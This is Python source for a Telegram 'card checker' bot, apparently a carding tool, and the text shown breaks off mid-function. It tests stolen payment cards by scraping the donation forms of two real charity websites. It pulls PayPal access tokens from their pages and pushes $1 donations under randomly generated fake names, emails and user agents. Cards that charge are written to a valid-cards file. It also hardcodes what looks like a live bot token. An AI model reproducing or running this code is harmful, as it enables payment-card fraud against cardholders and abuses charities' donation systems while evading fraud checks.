import asyncio
import logging
import json
import random
import string
import os
from datetime import datetime
from typing import Dict, List, Optional
import aiohttp
import aiofiles
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram.enums import ParseMode
import html

# استيراد مكتبات البوابات
import requests
import base64
import re
import uuid
import time
from mimesis import Generic as Gen
from mimesis.locales import Locale
from requests_toolbelt.multipart.encoder import MultipartEncoder
from fake_useragent import UserAgent

# ===========================================
# إعدادات البوت
# ===========================================
BOT_TOKEN = "8288151123:AAEiCJIc2qLpX1VHZntL34pjEzsctCo1tuA"
ADMIN_ID = 8336843556
LOG_CHANNEL = "@chkchannel11"

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# إعداد الروتر
router = Router()

# ===========================================
# إعدادات الملفات
# ===========================================
VALID_CARDS_FILE = "valid_cards.txt"
PROCESSING_FILE = "processing.txt"
USER_STATS_FILE = "user_stats.json"

# ===========================================
# قاعدة بيانات المستخدمين
# ===========================================
user_sessions = {}
user_stats = {}

# ===========================================
# شعار البوت
# ===========================================
CHANEL_LOGO = """
╔═══════════════════════════════════════╗
║     🔥 PREMIUM CARD CHECKER BOT 🔥    ║
║        💳 Multi-Gateway Support       ║
║           @chkchannel11               ║
╚═══════════════════════════════════════╝
"""

# ===========================================
# فئة البوابات الحقيقية
# ===========================================
class RealPayPalGateway:
    """بوابة PayPal الحقيقية للتحقق من البطاقات"""
    
    def __init__(self):
        self.ua = UserAgent()
        self.gen = Gen(Locale.EN)
        
        # قاعدة بيانات BIN
        self.bin_database = {
            "5208": {"type": "MASTERCARD", "brand": "DEBIT", "bank": "CLOSED JOINT STOCK", "country": "BELARUS", "flag": "🇧🇾"},
            "4556": {"type": "VISA", "brand": "CREDIT", "bank": "CHASE BANK", "country": "USA", "flag": "🇺🇸"},
            "4111": {"type": "VISA", "brand": "CREDIT", "bank": "BANK OF AMERICA", "country": "USA", "flag": "🇺🇸"},
            "5112": {"type": "MASTERCARD", "brand": "DEBIT", "bank": "WELLS FARGO", "country": "USA", "flag": "🇺🇸"},
            "4012": {"type": "VISA", "brand": "DEBIT", "bank": "CITIBANK", "country": "USA", "flag": "🇺🇸"},
            "3782": {"type": "AMEX", "brand": "CREDIT", "bank": "AMERICAN EXPRESS", "country": "USA", "flag": "🇺🇸"},
            "6011": {"type": "DISCOVER", "brand": "CREDIT", "bank": "DISCOVER BANK", "country": "USA", "flag": "🇺🇸"},
            "4217": {"type": "VISA", "brand": "CREDIT", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": "🇺🇳"},
        }
    
    def get_random_user_agent(self):
        """الحصول على وكيل مستخدم عشوائي"""
        return self.ua.random
    
    def get_card_info(self, card_number):
        """الحصول على معلومات البطاقة"""
        card_number = str(card_number).replace(" ", "")
        
        if len(card_number) >= 4:
            bin_prefix = card_number[:4]
            for bin_code, info in self.bin_database.items():
                if bin_prefix.startswith(bin_code):
                    return info
        
        # معلومات افتراضية
        if card_number.startswith("4"):
            return {"type": "VISA", "brand": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": "🇺🇳"}
        elif card_number.startswith("5"):
            return {"type": "MASTERCARD", "brand": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": "🇺🇳"}
        elif card_number.startswith("3"):
            return {"type": "AMEX", "brand": "CREDIT", "bank": "AMERICAN EXPRESS", "country": "USA", "flag": "🇺🇸"}
        elif card_number.startswith("6"):
            return {"type": "DISCOVER", "brand": "CREDIT", "bank": "DISCOVER BANK", "country": "USA", "flag": "🇺🇸"}
        else:
            return {"type": "UNKNOWN", "brand": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": "🇺🇳"}
    
    def parse_card_line(self, card_line):
        """تحليل سطر البطاقة"""
        card_line = card_line.strip()
        
        # دعم تنسيقات متعددة
        separators = ['|', '/', ';', ':', ' ', '::', '||']
        
        for sep in separators:
            if sep in card_line:
                parts = [p.strip() for p in card_line.split(sep) if p.strip()]
                if len(parts) >= 4:
                    number = parts[0].replace(" ", "")
                    month = parts[1].zfill(2)
                    year = parts[2]
                    cvv = parts[3]
                    
                    # تصحيح السنة
                    if len(year) == 4:
                        year = year[2:]
                    
                    return number, month, year, cvv
        
        return None
    
    def luhn_check(self, card_number):
        """فحص خوارزمية لوهن"""
        card_number = str(card_number).replace(" ", "")
        
        if not card_number.isdigit():
            return False
        
        total = 0
        reverse_digits = card_number[::-1]
        
        for i, digit in enumerate(reverse_digits):
            n = int(digit)
            if i % 2 == 1:
                n *= 2
                if n > 9:
                    n -= 9
            total += n
        
        return total % 10 == 0
    
    def check_expiry(self, month, year):
        """فحص صلاحية البطاقة"""
        try:
            current_year = datetime.now().year % 100
            current_month = datetime.now().month
            
            month_int = int(month)
            year_int = int(year) if len(year) == 2 else int(year) % 100
            
            if year_int < current_year:
                return False, "EXPIRED"
            elif year_int == current_year and month_int < current_month:
                return False, "EXPIRED"
            elif month_int < 1 or month_int > 12:
                return False, "INVALID_MONTH"
            else:
                return True, "VALID"
        except:
            return False, "INVALID_FORMAT"
    
    def generate_user_info(self):
        """إنشاء معلومات مستخدم عشوائية"""
        first_name = self.gen.person.first_name()
        last_name = self.gen.person.last_name()
        
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com']
        email = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@{random.choice(domains)}"
        
        return {
            'first_name': first_name,
            'last_name': last_name,
            'email': email,
            'user_agent': self.get_random_user_agent()
        }
    
    def _parse_response(self, text):
        """تحليل استجابة البوابة"""
        if 'true' in text or 'sucsess' in text or 'success' in text:    
            return {'status': 'CHARGED', 'message': '✅ Charged $1', 'code': 'APPROVED'}
        elif 'DO_NOT_HONOR' in text:
            return {'status': 'DO_NOT_HONOR', 'message': '❌ Do Not Honor', 'code': 'DECLINED'}
        elif 'ACCOUNT_CLOSED' in text:
            return {'status': 'ACCOUNT_CLOSED', 'message': '❌ Account Closed', 'code': 'DECLINED'}
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return {'status': 'ACCOUNT_CLOSED', 'message': '❌ Account Closed', 'code': 'DECLINED'}
        elif 'LOST_OR_STOLEN' in text:
            return {'status': 'LOST_OR_STOLEN', 'message': '❌ Lost Or Stolen', 'code': 'DECLINED'}
        elif 'CVV2_FAILURE' in text:
            return {'status': 'CVV_FAILURE', 'message': '❌ Card Issuer Declined CVV', 'code': 'DECLINED'}
        elif 'SUSPECTED_FRAUD' in text:
            return {'status': 'SUSPECTED_FRAUD', 'message': '❌ Suspected Fraud', 'code': 'DECLINED'}
        elif 'INVALID_ACCOUNT' in text:
            return {'status': 'INVALID_ACCOUNT', 'message': '❌ Invalid Account', 'code': 'DECLINED'}
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return {'status': 'REATTEMPT_NOT_PERMITTED', 'message': '❌ Reattempt Not Permitted', 'code': 'DECLINED'}
        elif 'ACCOUNT BLOCKED BY ISSUER' in text or 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
            return {'status': 'ACCOUNT_BLOCKED', 'message': '❌ Account Blocked By Issuer', 'code': 'DECLINED'}
        elif 'ORDER_NOT_APPROVED' in text:
            return {'status': 'ORDER_NOT_APPROVED', 'message': '❌ Order Not Approved', 'code': 'DECLINED'}
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return {'status': 'PICKUP_CARD', 'message': '❌ Pickup Card Special Conditions', 'code': 'DECLINED'}
        elif 'PAYER_CANNOT_PAY' in text:
            return {'status': 'PAYER_CANNOT_PAY', 'message': '❌ Payer Cannot Pay', 'code': 'DECLINED'}
        elif 'INSUFFICIENT_FUNDS' in text:
            return {'status': 'INSUFFICIENT_FUNDS', 'message': '❌ Insufficient Funds', 'code': 'DECLINED'}
        elif 'GENERIC_DECLINE' in text:
            return {'status': 'GENERIC_DECLINE', 'message': '❌ Generic Decline', 'code': 'DECLINED'}
        elif 'COMPLIANCE_VIOLATION' in text:
            return {'status': 'COMPLIANCE_VIOLATION', 'message': '❌ Compliance Violation', 'code': 'DECLINED'}
        elif 'TRANSACTION_NOT PERMITTED' in text or 'TRANSACTION_NOT_PERMITTED' in text:
            return {'status': 'TRANSACTION_NOT_PERMITTED', 'message': '❌ Transaction Not Permitted', 'code': 'DECLINED'}
        elif 'PAYMENT_DENIED' in text:
            return {'status': 'PAYMENT_DENIED', 'message': '❌ Payment Denied', 'code': 'DECLINED'}
        elif 'INVALID_TRANSACTION' in text:
            return {'status': 'INVALID_TRANSACTION', 'message': '❌ Invalid Transaction', 'code': 'DECLINED'}
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return {'status': 'RESTRICTED_ACCOUNT', 'message': '❌ Restricted Or Inactive Account', 'code': 'DECLINED'}
        elif 'SECURITY_VIOLATION' in text:
            return {'status': 'SECURITY_VIOLATION', 'message': '❌ Security Violation', 'code': 'DECLINED'}
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return {'status': 'DECLINED_UPDATED_ACCOUNT', 'message': '❌ Declined Due To Updated Account', 'code': 'DECLINED'}
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return {'status': 'INVALID_CARD', 'message': '❌ Invalid Card', 'code': 'DECLINED'}
        elif 'EXPIRED_CARD' in text:
            return {'status': 'EXPIRED_CARD', 'message': '❌ Expired Card', 'code': 'DECLINED'}
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return {'status': 'CRYPTOGRAPHIC_FAILURE', 'message': '❌ Cryptographic Failure', 'code': 'DECLINED'}
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return {'status': 'TRANSACTION_CANNOT_COMPLETE', 'message': '❌ Transaction Cannot Be Completed', 'code': 'DECLINED'}
        elif 'DECLINED_PLEASE_RETRY' in text:
            return {'status': 'DECLINED_RETRY', 'message': '❌ Declined Please Retry Later', 'code': 'DECLINED'}
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return {'status': 'EXCEED_LIMIT', 'message': '❌ Exceed Limit', 'code': 'DECLINED'}
        else:
            return {'status': 'UNKNOWN', 'message': '❓ Unknown Response', 'code': 'UNKNOWN'}
    
    def check_card_rarediseases(self, ccx):
        """بوابة rarediseasesinternational.org - PayPal $1"""
        try:
            r = requests.Session()
            user = self.get_random_user_agent()
            
            ccx = ccx.strip()
            n = ccx.split("|")[0]
            mm = ccx.split("|")[1]
            yy = ccx.split("|")[2]
            cvc = ccx.split("|")[3].strip()
            
            if "20" in yy:
                yy = yy.split("20")[1]
            
            headers = {
                'user-agent': user,
            }
            
            response = r.get('https://www.rarediseasesinternational.org/donate', cookies=r.cookies, headers=headers)
            
            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
            nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
            
            enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
            
            headers = {
                'origin': 'https://rarediseasesinternational.org',
                'referer': 'https://www.rarediseasesinternational.org/donate',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            user_info = self.generate_user_info()
            
            data = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1,
                'give-form-id': id_form2,
                'give-form-title': '',
                'give-current-url': 'https://www.rarediseasesinternational.org/donate',
                'give-form-url': 'https://www.rarediseasesinternational.org/donate',
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': '1.00',
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': user_info['first_name'],
                'give_last': user_info['last_name'],
                'give_email': user_info['email'],
                'card_name': f"{user_info['first_name']} {user_info['last_name']}",
                'card_exp_month': '',
                'card_exp_year': '',
                'give_action': 'purchase',
                'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }
            
            response = r.post('https://rarediseasesinternational.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
            
            data = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate'),
                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate'),
                'give-form-minimum': (None, '1.00'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1.00'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, user_info['first_name']),
                'give_last': (None, user_info['last_name']),
                'give_email': (None, user_info['email']),
                'card_name': (None, f"{user_info['first_name']} {user_info['last_name']}"),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers = {
                'content-type': data.content_type,
                'origin': 'https://rarediseasesinternational.org',
                'referer': 'https://www.rarediseasesinternational.org/donate',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            params = {
                'action': 'give_paypal_commerce_create_order',
            }
            
            response = r.post(
                'https://rarediseasesinternational.org/wp-admin/admin-ajax.php',
                params=params,
                cookies=r.cookies,
                headers=headers,
                data=data
            )
            tok = response.json()['data']['id']
            
            headers = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
                'authorization': f'Bearer {au}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user,
            }
            
            json_data = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvc,
                        'attributes': {
                            'verification': {
                                'method': 'SCA_WHEN_REQUIRED',
                            },
                        },
                    },
                },
                'application_context': {
                    'vault': False,
                },
            }
            
            response = r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers=headers,
                json=json_data,
            )
            
            data = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate'),
                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate'),
                'give-form-minimum': (None, '1.00'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1.00'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, user_info['first_name']),
                'give_last': (None, user_info['last_name']),
                'give_email': (None, user_info['email']),
                'card_name': (None, f"{user_info['first_name']} {user_info['last_name']}"),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers = {
                'content-type': data.content_type,
                'origin': 'https://rarediseasesinternational.org',
                'referer': 'https://www.rarediseasesinternational.org/donate',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            params = {
                'action': 'give_paypal_commerce_approve_order',
                'order': tok,
            }
            
            response = r.post(
                'https://rarediseasesinternational.org/wp-admin/admin-ajax.php',
                params=params,
                cookies=r.cookies,
                headers=headers,
                data=data
            )
            
            return self._parse_response(response.text), user_info
            
        except Exception as e:
            return {'status': 'ERROR', 'message': f'❌ Error: {str(e)}', 'code': 'ERROR'}, None
    
    def check_card_crisiscafe(self, ccx):
        """بوابة crisiscafe.org - PayPal $1"""
        try:
            r = requests.Session()
            user = self.get_random_user_agent()
            
            ccx = ccx.strip()
            n = ccx.split("|")[0]
            mm = ccx.split("|")[1]
            yy = ccx.split("|")[2]
            cvc = ccx.split("|")[3].strip()
            
            if "20" in yy:
                yy = yy.split("20")[1]
            
            headers = {
                'user-agent': user,
            }
            
            response = r.get('https://crisiscafe.org/donate-now/', cookies=r.cookies, headers=headers)
            
            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
            nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
            
            enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
            
            headers = {
                'origin': 'https://crisiscafe.org',
                'referer': 'https://crisiscafe.org/donate-now/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            user_info = self.generate_user_info()
            
            data = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1,
                'give-form-id': id_form2,
                'give-form-title': '',
                'give-current-url': 'https://crisiscafe.org/donate-now/',
                'give-form-url': 'https://crisiscafe.org/donate-now/',
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': '1.00',
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': user_info['first_name'],
                'give_last': user_info['last_name'],
                'give_email': user_info['email'],
                'card_name': f"{user_info['first_name']} {user_info['last_name']}",
                'card_exp_month': '',
                'card_exp_year': '',
                'give_action': 'purchase',
                'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }
            
            response = r.post('https://crisiscafe.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
            
            data = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://crisiscafe.org/donate-now/'),
                'give-form-url': (None, 'https://crisiscafe.org/donate-now/'),
                'give-form-minimum': (None, '1.00'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1.00'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, user_info['first_name']),
                'give_last': (None, user_info['last_name']),
                'give_email': (None, user_info['email']),
                'card_name': (None, f"{user_info['first_name']} {user_info['last_name']}"),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers = {
                'content-type': data.content_type,
                'origin': 'https://crisiscafe.org',
                'referer': 'https://crisiscafe.org/donate-now/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            params = {
                'action': 'give_paypal_commerce_create_order',
            }
            
            response = r.post(
                'https://crisiscafe.org/wp-admin/admin-ajax.php',
                params=params,
                cookies=r.cookies,
                headers=headers,
                data=data
            )
            tok = response.json()['data']['id']
            
            headers = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
                'authorization': f'Bearer {au}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user,
            }
            
            json_data = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvc,
                        'attributes': {
                            'verification': {
                                'method': 'SCA_WHEN_REQUIRED',
                            },
                        },
                    },
                },
                'application_context': {
                    'vault': False,
                },
            }
            
            response = r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers=headers,
                json=json_data,
            )
            
            data = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://crisiscafe.org/donate-now/'),
                'give-form-url': (None, 'https://crisiscafe.org/donate-now/'),
                'give-form-minimum': (None, '1.00'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1.00'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, user_info['first_name']),
                'give_last': (None, user_info['last_name']),
                'give_email': (None, user_info['email']),
                'card_name': (None, f"{user_info['first_name']} {user_info['last_name']}"),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers = {
                'content-type': data.content_type,
                'origin': 'https://crisiscafe.org',
                'referer': 'https://crisiscafe.org/donate-now/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            params = {
                'action': 'give_paypal_commerce_approve_order',
                'order': tok,
            }
            
            response = r.post(
                'https://crisiscafe.org/wp-admin/admin-ajax.php',
                params=params,
                cookies=r.cookies,
                headers=headers,
                data=data
            )
            
            return self._parse_response(response.text), user_info
            
        except Exception as e:
            return {'status': 'ERROR', 'message': f'❌ Error: {str(e)}', 'code': 'ERROR'}, None
    
    def process_single_card(self, card_line, gateway_type="crisiscafe"):
        """معالجة بطاقة واحدة باستخدام البوابة المحددة"""
        start_time = time.time()
        
        # تحليل البطاقة
        parsed = self.parse_card_line(card_line)
        if not parsed:
            return {
                'status': 'INVALID_FORMAT',
                'message': '❌ تنسيق البطاقة غير صحيح',
                'time': 0,
                'card_display': card_line
            }
        
        number, month, year, cvv = parsed
        
        # فحوصات أولية
        if not self.luhn_check(number):
            return {
                'status': 'INVALID_CARD',
                'message': '❌ رقم البطاقة غير صحيح (Luhn Check Failed)',
                'time': round(time.time() - start_time, 1),
                'card_display': f"{number[:6]}******{number[-4:]}",
                'card_info': self.get_card_info(number)
            }
        
        expiry_valid, expiry_msg = self.check_expiry(month, year)
        if not expiry_valid:
            return {
                'status': expiry_msg,
                'message': f'❌ البطاقة {expiry_msg.lower()}',
                'time': round(time.time() - start_time, 1),
                'card_display': f"{number[:6]}******{number[-4:]}",
                'card_info': self.get_card_info(number)
            }
        
        card_info = self.get_card_info(number)
        
        # اختيار البوابة
        if gateway_type == "rarediseases":
            result, user_info = self.check_card_rarediseases(card_line)
        else:  # crisiscafe
            result, user_info = self.check_card_crisiscafe(card_line)
        
        elapsed_time = round(time.time() - start_time, 1)
        
        return {
            'status': result['status'],
            'message': result['message'],
            'time': elapsed_time,
            'card_display': f"{number[:6]}******{number[-4:]}",
            'card_info': card_info,
            'user_info': user_info if user_info else self.generate_user_info(),
            'code': result['code'],
            'month': month,
            'year': year
        }

# ===========================================
# إنشاء كائن البوابة
# ===========================================
gateway = RealPayPalGateway()

# ===========================================
# وظائف المساعدة
# ===========================================
async def save_valid_card(card_line, result):
    """حفظ البطاقة الصالحة"""
    try:
        async with aiofiles.open(VALID_CARDS_FILE, 'a', encoding='utf-8') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            await f.write(f"{timestamp} | {card_line} | {result['message']}\n")
    except Exception as e:
        logger.error(f"Error saving card: {e}")

async def update_user_stats(user_id, result):
    """تحديث إحصائيات المستخدم"""
    if user_id not in user_stats:
        user_stats[user_id] = {
            'total_checked': 0,
            'valid_cards': 0,
            'declined_cards': 0,
            'last_check': None
        }
    
    user_stats[user_id]['total_checked'] += 1
    user_stats[user_id]['last_check'] = datetime.now().isoformat()
    
    if result['status'] == 'CHARGED':
        user_stats[user_id]['valid_cards'] += 1
    else:
        user_stats[user_id]['declined_cards'] += 1
    
    # حفظ الإحصائيات
    try:
        async with aiofiles.open(USER_STATS_FILE, 'w', encoding='utf-8') as f:
            await f.write(json.dumps(user_stats, indent=2))
    except Exception as e:
        logger.error(f"Error saving stats: {e}")

def escape_markdown(text):
    """تهريب الأحرف الخاصة في Markdown"""
    if text is None:
        return 'Unknown'
    text = str(text)
    # تهريب الأحرف الخاصة
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

async def format_card_result(card_line, result):
    """تنسيق نتيجة البطاقة"""
    card_info = result.get('card_info', {})
    user_info = result.get('user_info', {})
    
    # تحديد الرمز بناءً على الحالة
    if result.get('status') == 'CHARGED':
        status_emoji = "✅"
        status_text = "Approved 🔥"
    elif result.get('code') == 'DECLINED':
        status_emoji = "❌"
        status_text = "Declined"
    else:
        status_emoji = "❓"
        status_text = "Unknown"
    
    # الحصول على القيم بأمان
    card_display = result.get('card_display', 'N/A')
    month = result.get('month', 'MM')
    year = result.get('year', 'YY')
    bank = card_info.get('bank', 'Unknown')
    country = card_info.get('country', 'Unknown')
    flag = card_info.get('flag', '')
    card_type = card_info.get('type', 'Unknown')
    brand = card_info.get('brand', 'Unknown')
    result_msg = result.get('message', 'No message')
    time_taken = result.get('time', 0)
    first_name = user_info.get('first_name', 'Unknown') if user_info else 'Unknown'
